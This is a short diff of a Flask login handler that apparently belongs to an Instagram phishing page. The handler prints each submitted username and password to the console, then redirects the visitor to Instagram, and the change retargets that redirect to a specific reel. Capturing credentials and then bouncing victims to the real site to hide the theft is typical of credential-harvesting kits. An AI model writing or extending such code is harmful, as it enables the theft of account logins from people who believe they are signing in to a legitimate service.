@@ -8,7 +8,7 @@ def login():
     if name and paswd:
         print("name : ", name)
         print("password : ", paswd)
-        return redirect("https://www.instagram.com/")
+        return redirect("https://www.instagram.com/reels/DCsuZOJxnEb/")
     return render_template('index.html')
 
 if __name__ == '__main__':
